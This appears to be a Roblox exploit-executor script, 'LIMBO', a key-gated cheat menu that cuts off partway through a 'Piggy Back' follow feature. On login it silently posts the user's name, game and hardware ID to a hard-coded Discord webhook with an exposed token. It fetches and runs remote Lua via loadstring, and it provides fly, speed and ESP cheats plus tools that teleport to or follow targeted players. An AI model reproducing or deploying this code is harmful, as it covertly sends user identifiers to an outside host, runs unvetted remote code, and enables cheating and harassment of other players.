function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

local notiname = game.Players.LocalPlayer.Name
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()


local url = "https://discord.com/api/webhooks/1271162746636996711/saFKu2L6lBJq9epR6sNvEYyRo_HqXNFKr8kphPC3PLbxFxKWjkjwOnV08NZdWdV_3QBa"

-- Create a Sound object
local notisound = Instance.new("Sound")
local loginsound = Instance.new("Sound")
local clicksound = Instance.new("Sound")
local hoversound = Instance.new("Sound")

-- Set the SoundId (replace with the asset ID of the sound you want to play)
notisound.SoundId = "rbxassetid://2865227271"
loginsound.SoundId = "rbxassetid://5072915476"
clicksound.SoundId = "rbxassetid://4499400560"
hoversound.SoundId = "rbxassetid://542332175"

-- Set the parent of the sound to somewhere it can play (e.g., Workspace)
notisound.Parent = game.Workspace
loginsound.Parent = game.Workspace
clicksound.Parent = game.Workspace
hoversound.Parent = game.Workspace

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local enterkey = Instance.new("TextBox")
local UICorner_2 = Instance.new("UICorner")
local key = Instance.new("ImageButton")
local dc = Instance.new("ImageButton")
local X = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Updates = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")


--Properties:

ScreenGui.Parent = game.CoreGui


Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0.247059, 0.247059, 0.247059)
Frame.BorderColor3 = Color3.fromRGB(62, 50, 68)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.401209682, 0, 0.303160727, 0)
Frame.Size = UDim2.new(0, 341, 0, 181)
Frame.Active = true
Frame.Draggable = true

UICorner.Parent = Frame

enterkey.Name = "enterkey"
enterkey.Parent = Frame
enterkey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
enterkey.BackgroundTransparency = 0.950
enterkey.BorderColor3 = Color3.fromRGB(0, 0, 0)
enterkey.BorderSizePixel = 0
enterkey.Position = UDim2.new(0.20527859, 0, 0.359116018, 0)
enterkey.Size = UDim2.new(0, 200, 0, 50)
enterkey.Font = Enum.Font.GrenzeGotisch
enterkey.LineHeight = 0.940
enterkey.Text = "Enter Key..."
enterkey.TextColor3 = Color3.new(1.000000, 0.450980, 0.000000)
enterkey.TextSize = 42.000
enterkey.MouseEnter:Connect(function()
hoversound:Play()
end)

UICorner_2.Parent = enterkey

key.Name = "key"
key.Parent = Frame
key.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
key.BackgroundTransparency = 1.000
key.BorderColor3 = Color3.fromRGB(0, 0, 0)
key.BorderSizePixel = 0
key.Position = UDim2.new(0.316715539, 0, 0.6961326, 0)
key.Size = UDim2.new(0, 39, 0, 39)
key.Image = "http://www.roblox.com/asset/?id=4974046033"
key.MouseEnter:Connect(function()
hoversound:Play()
end)
key.MouseButton1Down:Connect(function()
clicksound:Play()
if enterkey.Text == "limbo2024" then

loginsound:Play()



local embed = {
    ["title"] = "Player just logged in!",
    ["description"] = "A player just logged in to LIMBO",
    ["color"] = 1,
    ["fields"] = {
        {
            ["name"] = "User",
            ["value"] = notiname
        },
        {
            ["name"] = "Game",
            ["value"] = gameName
        }
    },
    ["footer"] = {
        ["text"] = "HWID: "..hwid
    }
}
SendMessageEMBED(url, embed)



enterkey:Destroy()
key:Destroy()
dc:Destroy()

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 0.900
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.307917893, 0, 0.403314918, 0)
TextButton.Size = UDim2.new(0, 130, 0, 35)
TextButton.Font = Enum.Font.GrenzeGotisch
TextButton.Text = "EXECUTE"
TextButton.TextColor3 = Color3.new(1.000000, 0.450980, 0.000000)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.Active = false
TextButton.MouseEnter:Connect(function()
hoversound:Play()
end)
TextButton.MouseButton1Down:Connect(function()
clicksound:Play()




--BIG BOY MELLANRUM























-- Create the sound instance outside the toggle callback
local soundd = Instance.new("Sound")
soundd.SoundId = "rbxassetid://5072915476" -- Replace with your sound ID
soundd.Looped = false -- Ensure the sound loops
soundd.Parent = game.Workspace



local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()

local GUI = Mercury:Create{
    Name = "LIMBO",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Rust,
    Link = "https://github.com/Purpi123/LIMBO"
}

soundd:Play()



local LocalTab = GUI:Tab{
	Name = "Local Player",
	Icon = "http://www.roblox.com/asset/?id=6723742952"
}




LocalTab:Slider{
	Name = "Walk Speed",
	Default = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed,
	Min = 0,
	Max = 500,
	Callback = function(wsValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (wsValue)
     end
}

LocalTab:Button{
	Name = "Deafault Walk Speed",
	Description = nil,
	Callback = function() 
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
    
    end



}

LocalTab:Slider{
	Name = "Jump Power",
	Default = game.Players.LocalPlayer.Character.Humanoid.JumpPower,
	Min = 0,
	Max = 500,
	Callback = function(wsValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = (wsValue)
     end
}

LocalTab:Button{
	Name = "Deafault Jump Power",
	Description = nil,
	Callback = function() 
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
    
    end



}

LocalTab:Toggle{
	Name = "Infinite Jump",
	StartingState = false,
	Description = nil,
	Callback = function(state)
    
    if (state) == true then
-- Infinite Jump Enable Script
_G.InfiniteJumpEnabled = true

-- Function to handle jumping
local function onJumpRequest()
    if _G.InfiniteJumpEnabled then
        game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
    end
end

-- Bind the function to the JumpRequest event
if not _G.JumpConnection then
    _G.JumpConnection = game:GetService("UserInputService").JumpRequest:Connect(onJumpRequest)
end

print("Infinite Jump Enabled")

        else
-- Infinite Jump Disable Script
_G.InfiniteJumpEnabled = false

-- Unbind the JumpRequest event if it exists
if _G.JumpConnection then
    _G.JumpConnection:Disconnect()
    _G.JumpConnection = nil
end

print("Infinite Jump Disabled")

    end
    
     end
}


LocalTab:Slider{
	Name = "Health [CS]",
	Default = game.Players.LocalPlayer.Character.Humanoid.Health,
	Min = 0,
	Max = 500,
	Callback = function(wsValue)
    game.Players.LocalPlayer.Character.Humanoid.Health = (wsValue)
     end
}


LocalTab:Button{
	Name = "Force Reset",
	Description = nil,
	Callback = function()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
     end
}

local flyspeeed = 20

LocalTab:Toggle{
	Name = "Fly",
	StartingState = false,
	Description = nil,
	Callback = function(state)
     if (state) == true then
-- Fly Script with Camera-Aligned Movement and Stable Orientation
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local torso = character:WaitForChild("HumanoidRootPart")
local flying = false
local speed = flyspeeed
local camera = game.Workspace.CurrentCamera
local keysPressed = {}

local function startFlying()
    local bg = Instance.new("BodyGyro", torso)
    bg.MaxTorque = Vector3.new(4000, 4000, 4000)
    bg.P = 20000 -- Proportional gain to stabilize orientation
    
    local bv = Instance.new("BodyVelocity", torso)
    bv.MaxForce = Vector3.new(4000, 4000, 4000)
    bv.Velocity = Vector3.new(0, 0, 0)
    
    flying = true
    humanoid.PlatformStand = true
    
    local function updateVelocity()
    speed = flyspeeed
        local moveDirection = Vector3.new(0, 0, 0)
        local forwardDirection = camera.CFrame.lookVector
        local rightDirection = camera.CFrame.rightVector
        
        if keysPressed["W"] then
            moveDirection = forwardDirection
        elseif keysPressed["S"] then
            moveDirection = -forwardDirection
        end
        
        if keysPressed["A"] then
            moveDirection = moveDirection - rightDirection
        elseif keysPressed["D"] then
            moveDirection = moveDirection + rightDirection
        end
        
        moveDirection = moveDirection.unit * speed
        bv.Velocity = moveDirection
        
        -- Update BodyGyro to stabilize orientation
        bg.CFrame = CFrame.new(torso.Position, torso.Position + forwardDirection)
    end
    
    local function updateFlight()
    speed = flyspeeed
        while flying do
            if keysPressed["W"] or keysPressed["S"] or keysPressed["A"] or keysPressed["D"] then
                updateVelocity()
            else
                bv.Velocity = Vector3.new(0, 0, 0) -- Constant upward velocity when no movement keys are pressed
            end
            wait()
        end
        
        bv:Destroy()
        bg:Destroy()
        humanoid.PlatformStand = false
    end
    
    game:GetService("UserInputService").InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            keysPressed[input.KeyCode.Name] = true
            updateVelocity()
        end
    end)

    game:GetService("UserInputService").InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            keysPressed[input.KeyCode.Name] = nil
            updateVelocity()
        end
    end)
    
    updateFlight()
end

startFlying()




        else
-- Unfly Script
local player = game.Players.LocalPlayer
local character = player.Character

if character then
    local torso = character:FindFirstChild("HumanoidRootPart")
    if torso then
        for _, instance in ipairs(torso:GetChildren()) do
            if instance:IsA("BodyVelocity") or instance:IsA("BodyGyro") then
                instance:Destroy()
            end
        end
        player.Character.Humanoid.PlatformStand = false
    end
end





        end
     end
}



LocalTab:Slider{
	Name = "Fly Speed",
	Default = 20,
	Min = 0,
	Max = 500,
	Callback = function(wsValue)
    flyspeeed = (wsValue)
    print(flyspeeed)
     end
}


LocalTab:Button{
	Name = "Headless [CS]",
	Description = nil,
	Callback = function()
    -- Headless Head Script (Local)

-- Function to make the head invisible
local function makeHeadless()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    
    local head = character:FindFirstChild("Head")
    if head then
        head.Transparency = 1
        head.face:Destroy()  -- Remove the face decal if it exists
    end
end

-- Function to restore the head visibility
local function restoreHead()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    
    local head = character:FindFirstChild("Head")
    if head then
        head.Transparency = 0
        if not head:FindFirstChild("face") then
            -- Add a default face if it doesn't exist
            local face = Instance.new("Decal", head)
            face.Name = "face"
            face.Texture = "rbxasset://textures/face.png"
        end
    end
end

-- Example usage
makeHeadless()
-- restoreHead()  -- Uncomment this line to restore the head visibility

     end
}


LocalTab:Button{
	Name = "Korblox [CS] (NW)",
	Description = nil,
	Callback = function()

--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local char = game:GetService("Players").LocalPlayer.Character

-- LEFT LEG
char.LeftFoot.MeshId = "http://www.roblox.com/asset/?id=902942077"
char.LeftFoot.Transparency = 1
char.LeftLowerLeg.MeshId = "http://www.roblox.com/asset/?id=902942101"
char.LeftLowerLeg.TextureID = "http://roblox.com/asset/?id=902842271"
char.LeftUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942082"
char.LeftUpperLeg.TextureID = "http://roblox.com/asset/?id=902842271"


-- RIGHT LEG
char.RightFoot.MeshId = "http://www.roblox.com/asset/?id=902942089"
char.RightFoot.Transparency = 1
char.RightLowerLeg.MeshId = "http://www.roblox.com/asset/?id=902942093"
char.RightLowerLeg.Transparency = 1
char.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
char.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
     end
}


local NetAllTab = GUI:Tab{
	Name = "Cheating",
	Icon = "http://www.roblox.com/asset/?id=8360620314"
}

local espColor = Color3.new(1, 0, 0)
local chamsEnabled = false

NetAllTab:Toggle{
    Name = "+ESP+ Bodyparts",
    StartingState = false,
    Description = nil,
    Callback = function(state)
        chamsEnabled = state
        
        -- Define a function to create the ESP chams for a character
        local function createChams(character)
            for _, part in pairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    local highlight = Instance.new("BoxHandleAdornment")
                    highlight.Adornee = part
                    highlight.Size = part.Size
                    highlight.Color3 = espColor -- Use the dynamic color
                    highlight.AlwaysOnTop = true
                    highlight.ZIndex = 0
                    highlight.Transparency = 0.7
                    highlight.Parent = part
                end
            end
        end

        -- Define a function to remove ESP chams from a character
        local function removeChams(character)
            for _, part in pairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    for _, adornment in pairs(part:GetChildren()) do
                        if adornment:IsA("BoxHandleAdornment") then
                            adornment:Destroy()
                        end
                    end
                end
            end
        end

        -- Define a function to apply chams to all players
        local function applyChamsToAllPlayers()
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    createChams(player.Character)
                end
                player.CharacterAdded:Connect(function(character)
                    createChams(character)
                end)
            end
        end

        -- Define a function to remove chams from all players
        local function removeChamsFromAllPlayers()
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    removeChams(player.Character)
                end
            end
        end

        -- Start a loop to continuously apply chams if enabled
        spawn(function()
            while chamsEnabled do
                removeChamsFromAllPlayers()
                applyChamsToAllPlayers()
                wait(1)
            end
        end)

        -- Remove chams if disabled
        if not chamsEnabled then
            removeChamsFromAllPlayers()
        end
    end
}

NetAllTab:ColorPicker{
    Name = "Chams Color",
    Style = Mercury.ColorPickerStyles.Legacy,
    Callback = function(color)
        espColor = color
       
       
    end
}



local espColorName = Color3.new(1, 0, 0)
local nameEspEnabled = false

NetAllTab:Toggle{
    Name = "+ESP+ Name",
    StartingState = false,
    Description = nil,
    Callback = function(state)
        nameEspEnabled = state
        
        -- Define a function to create the Name ESP for a character
        local function createNameEsp(character)
            if character:FindFirstChild("Humanoid") and character:FindFirstChild("Head") then
                local head = character.Head
                if head:FindFirstChild("NameEsp") then return end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "NameEsp"
                billboardGui.AlwaysOnTop = true
                billboardGui.Size = UDim2.new(2, 0, 1, 0)
                billboardGui.StudsOffset = Vector3.new(0, 2, 0) -- Adjust this value to move the label above the head
                billboardGui.Adornee = head

                local textLabel = Instance.new("TextLabel")
                textLabel.Text = character.Name -- Display the player's username
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.TextColor3 = espColorName
                textLabel.BackgroundTransparency = 1
                textLabel.TextStrokeTransparency = 0.5
                textLabel.Parent = billboardGui

                billboardGui.Parent = head
            end
        end

        -- Define a function to remove Name ESP from a character
        local function removeNameEsp(character)
            if character:FindFirstChild("Head") then
                local head = character.Head
                if head:FindFirstChild("NameEsp") then
                    head.NameEsp:Destroy()
                end
            end
        end

        -- Define a function to apply Name ESP to all players
        local function applyNameEspToAllPlayers()
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    createNameEsp(player.Character)
                end
                player.CharacterAdded:Connect(function(character)
                    createNameEsp(character)
                end)
            end
        end

        -- Define a function to remove Name ESP from all players
        local function removeNameEspFromAllPlayers()
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    removeNameEsp(player.Character)
                end
            end
        end

        -- Start a loop to continuously apply Name ESP if enabled
        spawn(function()
            while nameEspEnabled do
                removeNameEspFromAllPlayers()
                applyNameEspToAllPlayers()
                wait(1)
            end
        end)

        -- Remove Name ESP if disabled
        if not nameEspEnabled then
            removeNameEspFromAllPlayers()
        end
    end
}

NetAllTab:ColorPicker{
    Name = "Name ESP Color",
    Style = Mercury.ColorPickerStyles.Legacy,
    Callback = function(color)
        espColorName = color
        
    end
}

local espColorBox = Color3.new(1, 0, 0)
local boxEspEnabled = false

NetAllTab:Toggle{
    Name = "+ESP+ Box",
    StartingState = false,
    Description = nil,
    Callback = function(state)
        boxEspEnabled = state
        
        -- Define a function to create the Box ESP for a character
        local function createBoxEsp(character)
            if character:FindFirstChild("HumanoidRootPart") then
                local rootPart = character.HumanoidRootPart
                if rootPart:FindFirstChild("BoxEsp") then return end

                local boxHandleAdornment = Instance.new("BoxHandleAdornment")
                boxHandleAdornment.Name = "BoxEsp"
                boxHandleAdornment.Adornee = rootPart
                boxHandleAdornment.Size = rootPart.Size + Vector3.new(2, 2, 2) -- Slightly larger than the root part
                boxHandleAdornment.Color3 = espColorBox -- Use the dynamic color
                boxHandleAdornment.AlwaysOnTop = true
                boxHandleAdornment.ZIndex = 0
                boxHandleAdornment.Transparency = 0.7
                boxHandleAdornment.Parent = rootPart
            end
        end

        -- Define a function to remove Box ESP from a character
        local function removeBoxEsp(character)
            if character:FindFirstChild("HumanoidRootPart") then
                local rootPart = character.HumanoidRootPart
                if rootPart:FindFirstChild("BoxEsp") then
                    rootPart.BoxEsp:Destroy()
                end
            end
        end

        -- Define a function to apply Box ESP to all players
        local function applyBoxEspToAllPlayers()
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    createBoxEsp(player.Character)
                end
                player.CharacterAdded:Connect(function(character)
                    createBoxEsp(character)
                end)
            end
        end

        -- Define a function to remove Box ESP from all players
        local function removeBoxEspFromAllPlayers()
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    removeBoxEsp(player.Character)
                end
            end
        end

        -- Start a loop to continuously apply Box ESP if enabled
        spawn(function()
            while boxEspEnabled do
                removeBoxEspFromAllPlayers()
                applyBoxEspToAllPlayers()
                wait(1)
            end
        end)

        -- Remove Box ESP if disabled
        if not boxEspEnabled then
            removeBoxEspFromAllPlayers()
        end
    end
}

NetAllTab:ColorPicker{
    Name = "Box ESP Color",
    Style = Mercury.ColorPickerStyles.Legacy,
    Callback = function(color)
        espColorBox = color
        -- If box ESP is already enabled, update the color for all characters
        if boxEspEnabled then
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    removeBoxEsp(player.Character)
                    createBoxEsp(player.Character)
                end
            end
        end
    end
}

local espColorChams = Color3.new(0, 1, 0) -- Default color (green)
local chamsEnabled = false

NetAllTab:Toggle{
    Name = "+ESP+ Chams",
    StartingState = false,
    Description = nil,
    Callback = function(state)
        chamsEnabled = state
        
        -- Define a function to create Chams ESP for a character
        local function createChams(character)
            if character:FindFirstChild("Head") then
                if not character:FindFirstChild("ESPHighlight") then
                    local highlight = Instance.new("Highlight")
                    highlight.Parent = character
                    highlight.Name = "ESPHighlight"
                    highlight.Adornee = character
                    highlight.FillColor = espColorChams
                    highlight.OutlineColor = espColorChams
                end
            end
        end

        -- Define a function to remove Chams ESP from a character
        local function removeChams(character)
            if character:FindFirstChild("ESPHighlight") then
                character.ESPHighlight:Destroy()
            end
        end

        -- Define a function to apply Chams ESP to all players
        local function applyChamsToAllPlayers()
            for _, player in ipairs(game.Players:GetPlayers()) do
                if player.Character then
                    createChams(player.Character)
                end
                player.CharacterAdded:Connect(function(character)
                    createChams(character)
                end)
            end
        end

        -- Define a function to remove Chams ESP from all players
        local function removeChamsFromAllPlayers()
            for _, player in ipairs(game.Players:GetPlayers()) do
                if player.Character then
                    removeChams(player.Character)
                end
            end
        end

        -- Start a loop to continuously apply Chams ESP if enabled
        spawn(function()
            while chamsEnabled do
                removeChamsFromAllPlayers()
                applyChamsToAllPlayers()
                wait(1)
            end
        end)

        -- Remove Chams ESP if disabled
        if not chamsEnabled then
            removeChamsFromAllPlayers()
        end
    end
}

NetAllTab:ColorPicker{
    Name = "Chams ESP Color",
    Style = Mercury.ColorPickerStyles.Legacy,
    Callback = function(color)
        espColorChams = color
        -- If Chams ESP is already enabled, update the color for all characters
        if chamsEnabled then
            for _, player in ipairs(game.Players:GetPlayers()) do
                if player.Character then
                    removeChams(player.Character)
                    createChams(player.Character)
                end
            end
        end
    end
}

local Players = game:GetService("Players")

-- Function to create the Info ESP for a character
local function createInfoEsp(character)
    local player = Players:GetPlayerFromCharacter(character)
    if player and character:FindFirstChild("Head") then
        local head = character.Head

        -- Create a BillboardGui for the info ESP
        local infoGui = Instance.new("BillboardGui")
        infoGui.Size = UDim2.new(0, 150, 0, 230)
        infoGui.Adornee = head
        infoGui.AlwaysOnTop = true
        infoGui.Parent = head

        -- Create the frame for the info display
        local frame = Instance.new("Frame")
        frame.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
        frame.BackgroundTransparency = 0.4
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.Parent = infoGui

        -- Create Display Name Label
        local displayNameLabel = Instance.new("TextLabel")
        displayNameLabel.Text = "Display Name: " .. player.DisplayName
        displayNameLabel.Size = UDim2.new(1, 0, 0, 30)
        displayNameLabel.BackgroundTransparency = 1
        displayNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        displayNameLabel.Parent = frame

        -- Create Username Label
        local usernameLabel = Instance.new("TextLabel")
        usernameLabel.Text = "User Name: " .. player.Name
        usernameLabel.Size = UDim2.new(1, 0, 0, 30)
        usernameLabel.Position = UDim2.new(0, 0, 0, 30)
        usernameLabel.BackgroundTransparency = 1
        usernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        usernameLabel.Parent = frame

        -- Create Health Label
        local healthLabel = Instance.new("TextLabel")
        healthLabel.Size = UDim2.new(1, 0, 0, 30)
        healthLabel.Position = UDim2.new(0, 0, 0, 60)
        healthLabel.BackgroundTransparency = 1
        healthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        healthLabel.Parent = frame

        -- Create Position Label
        local positionLabel = Instance.new("TextLabel")
        positionLabel.Size = UDim2.new(1, 0, 0, 30)
        positionLabel.Position = UDim2.new(0, 0, 0, 90)
        positionLabel.BackgroundTransparency = 1
        positionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        positionLabel.Parent = frame

        -- Create Account Age Label
        local accountAgeLabel = Instance.new("TextLabel")
        accountAgeLabel.Size = UDim2.new(1, 0, 0, 30)
        accountAgeLabel.Position = UDim2.new(0, 0, 0, 120)
        accountAgeLabel.BackgroundTransparency = 1
        accountAgeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        accountAgeLabel.Parent = frame

        -- Function to update health and position information
        local function updateInfo()
            if character:FindFirstChild("Humanoid") then
                healthLabel.Text = "Health: " .. math.ceil(character.Humanoid.Health) .. "/" .. character.Humanoid.MaxHealth
            end
            positionLabel.Text = "Position: " .. tostring(character.HumanoidRootPart.Position)
            accountAgeLabel.Text = "Account Age: " .. player.AccountAge .. " days"

            -- Adjust BillboardGui size based on distance
            local distance = (head.Position - workspace.CurrentCamera.CFrame.Position).magnitude
            local sizeFactor = math.clamp(1 / (distance / 10), 0.5, 1) -- Clamp the factor for minimum size
            infoGui.Size = UDim2.new(0, 150 * sizeFactor, 0, 230 * sizeFactor)

            -- Resize the text labels to match the size of the frame
            displayNameLabel.Size = UDim2.new(1, 0, 0, 30 * sizeFactor)
            usernameLabel.Size = UDim2.new(1, 0, 0, 30 * sizeFactor)
            healthLabel.Size = UDim2.new(1, 0, 0, 30 * sizeFactor)
            positionLabel.Size = UDim2.new(1, 0, 0, 30 * sizeFactor)
            accountAgeLabel.Size = UDim2.new(1, 0, 0, 30 * sizeFactor)
        end

        -- Connect to Humanoid health changes and update position
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.HealthChanged:Connect(updateInfo)
        end
        
        -- Update the info for the first time
        updateInfo()

        return infoGui -- Return the created GUI to manage it later
    end
    return nil
end

-- Function to remove Info ESP from a character
local function removeInfoEsp(character)
    if character:FindFirstChild("Head") then
        local head = character.Head
        if head:FindFirstChild("BillboardGui") then
            head.BillboardGui:Destroy()
        end
    end
end

-- Main toggle for the Info ESP
local infoEspEnabled = false
local infoGuiInstances = {} -- Store created GUIs for removal later

NetAllTab:Toggle{
    Name = "+ESP+ Info",
    StartingState = false,
    
    Callback = function(state)
        infoEspEnabled = state
        
        if infoEspEnabled then
            -- Create ESP for current players
            for _, player in pairs(Players:GetPlayers()) do
                if player.Character then
                    local infoGui = createInfoEsp(player.Character)
                    if infoGui then
                        infoGuiInstances[player.UserId] = infoGui -- Store the instance by UserId
                    end
                end
                player.CharacterAdded:Connect(function(character)
                    local infoGui = createInfoEsp(character)
                    if infoGui then
                        infoGuiInstances[player.UserId] = infoGui
                    end
                end)
            end
            
            -- Start a loop to continuously update the ESP if enabled
            spawn(function()
                while infoEspEnabled do
                    wait(1)
                    for userId, infoGui in pairs(infoGuiInstances) do
                        local player = Players:GetPlayerByUserId(userId)
                        if player and player.Character then
                            updateInfoEsp(player.Character, infoGui) -- Update the GUI with current data
                        else
                            removeInfoEsp(player.Character) -- Remove GUI if player is no longer available
                            infoGuiInstances[userId] = nil -- Clear the stored instance
                        end
                    end
                end
            end)
        else
            -- Remove all ESP GUIs when disabled
            for userId in pairs(infoGuiInstances) do
                local player = Players:GetPlayerByUserId(userId)
                if player and player.Character then
                    removeInfoEsp(player.Character)
                end
            end
            infoGuiInstances = {} -- Clear the stored instances
        end
    end
}

-- Update the info ESP for a character
function updateInfoEsp(character, infoGui)
    if character:FindFirstChild("Head") then
        local head = character.Head
        infoGui.Adornee = head -- Ensure the GUI is attached to the head
        infoGui.Enabled = true -- Make sure the GUI is enabled
    else
        infoGui.Enabled = false -- Disable if the head is not found
    end
end

-- Initial application for current players
if infoEspEnabled then
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character then
            local infoGui = createInfoEsp(player.Character)
            if infoGui then
                infoGuiInstances[player.UserId] = infoGui
            end
        end
    end
end









local NetTrollTab = GUI:Tab{
	Name = "Troll Players",
	Icon = "http://www.roblox.com/asset/?id=10507357657"

    
}

local pigvicval = ""

NetTrollTab:Textbox{
	Name = "Player",
	Callback = function(text)
    pigvicval = (text)

    GUI:Notification{
	Title = "LIMBO",
	Text = "New Target",
	Duration = 3,
	Callback = function() end
}
     end
}


NetTrollTab:Button{
	Name = "Teleport",
	Description = nil,
	Callback = function()
          		-- Define the partial username you want to teleport to
local partialUsername = pigvicval

-- Get the local player
local player = game.Players.LocalPlayer

-- Wait for the character to load
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- Function to teleport to the target player's position
local function teleportToPlayer(partialName)
    -- Find the target player with the partial username
    local targetPlayer = nil
    for _, p in pairs(game.Players:GetPlayers()) do
        if string.sub(p.Name, 1, string.len(partialName)):lower() == partialName:lower() then
            targetPlayer = p
            break
        end
    end
    
    if targetPlayer then
        -- Get the target player's character and HumanoidRootPart
        local targetCharacter = targetPlayer.Character
        if targetCharacter then
            local targetHumanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
            if targetHumanoidRootPart then
                -- Teleport the local player to the target player's position
                humanoidRootPart.CFrame = targetHumanoidRootPart.CFrame
                print("Teleported to " .. targetPlayer.Name)
            else
                print(targetPlayer.Name .. " does not have a HumanoidRootPart.")
            end
        else
            print(targetPlayer.Name .. " does not have a character.")
        end
    else
        print("Player with partial username '" .. partialName .. "' not found.")
    end
end

-- Call the function to teleport
teleportToPlayer(partialUsername)
     end
}

NetTrollTab:Button{
	Name = "Sneak Teleport",
	Description = nil,
	Callback = function()
    -- Define the partial username you want to teleport to
local partialUsername = pigvicval

-- Get the local player
local player = game.Players.LocalPlayer

-- Wait for the character to load
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- Function to teleport to the target player's position
local function teleportToPlayer(partialName)
    -- Find the target player with the partial username
    local targetPlayer = nil
    for _, p in pairs(game.Players:GetPlayers()) do
        if string.sub(p.Name, 1, string.len(partialName)):lower() == partialName:lower() then
            targetPlayer = p
            break
        end
    end
    
    if targetPlayer then
        -- Get the target player's character and HumanoidRootPart
        local targetCharacter = targetPlayer.Character
        if targetCharacter then
            local targetHumanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
            if targetHumanoidRootPart then
                -- Calculate the position 10 meters behind the target player
                local behindPosition = targetHumanoidRootPart.CFrame * CFrame.new(0, 0, 50)
                -- Teleport the local player to the calculated position
                humanoidRootPart.CFrame = CFrame.new(behindPosition.Position)
                print("Teleported to 10 meters behind " .. targetPlayer.Name)
            else
                print(targetPlayer.Name .. " does not have a HumanoidRootPart.")
            end
        else
            print(targetPlayer.Name .. " does not have a character.")
        end
    else
        print("Player with partial username '" .. partialName .. "' not found.")
    end
end

-- Call the function to teleport
teleportToPlayer(partialUsername)
     end
}

NetTrollTab:Toggle{
	Name = "Piggy Back",
	StartingState = false,
	Description = nil,
	Callback = function(state)
    if (state) == true then
        game.Players.LocalPlayer.Character.Humanoid.Sit = true
-- Execute this in your executor to start following
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local targetPlayerPartialName = pigvicval  -- Replace with the partial name of the player to follow
local followDistance = 2  -- Distance above the target player
local behindDistance = 1.5  -- Distance behind the target player

-- Function to find target player by partial name
local function findTargetPlayer(partialName)
    for _, targetPlayer in pairs(Players:GetPlayers()) do
        if string.match(string.lower(targetPlayer.Name), string.lower(partialName)) then
            return targetPlayer
        end
    end
    return nil
end

-- Create variables to hold BodyPosition and BodyGyro instances
local bodyPosition
local bodyGyro

local function followTarget()
